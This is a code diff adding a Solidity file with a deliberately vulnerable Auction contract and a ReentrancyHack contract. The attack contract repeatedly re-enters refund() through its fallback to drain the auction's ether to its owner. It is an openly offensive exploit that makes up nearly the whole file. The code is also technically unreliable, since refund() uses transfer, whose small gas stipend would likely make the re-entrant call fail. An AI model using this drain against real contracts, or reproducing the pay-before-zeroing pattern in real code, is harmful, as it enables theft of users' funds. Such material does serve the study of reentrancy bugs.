@@ -1,0 +1,60 @@
+pragma solidity ^0.4.23;
+
+contract Auction {
+  event Refund(address indexed sender, uint indexed amount, uint indexed timestamp);
+  mapping(address => uint) public bids;
+
+  function() public payable {
+    pay();
+  }
+
+  function pay() public payable {
+    bids[msg.sender] = msg.value;
+  }
+
+  function refund() public {
+    require(bids[msg.sender] > 0, "not enough money to refund");
+    msg.sender.transfer( bids[msg.sender] );
+    emit Refund(msg.sender, bids[msg.sender], now);
+    bids[msg.sender] = 0;
+  }
+}
+
+
+contract ReentrancyHack {
+  Auction public auction;
+  address public owner;
+  
+  constructor (address _auction) public payable {
+    auction = Auction(_auction);
+    owner = msg.sender;
+  }
+  
+  modifier onlyOwner { require(owner == msg.sender, "only owner"); _; }
+  
+  function moveFundsToTheBase() public onlyOwner() {
+      owner.transfer(address(this).balance);
+  }
+  
+  event EmitNumber(uint balance);
+  
+  function sendSomeEthFirst() public payable {
+     auction.pay.value(msg.value)();
+  }
+  
+  function checkBalance(address who) view public returns(uint) {
+    uint howMuch = auction.bids(who);
+    return howMuch;
+  }
+  
+  function hackDadShit() public {
+    auction.refund();
+  }
+
+  bool public onlyOnce = false;
+  function() public payable {
+    if (address(auction).balance > 0.1 ether) { 
+      auction.refund();
+    }
+  }
+}
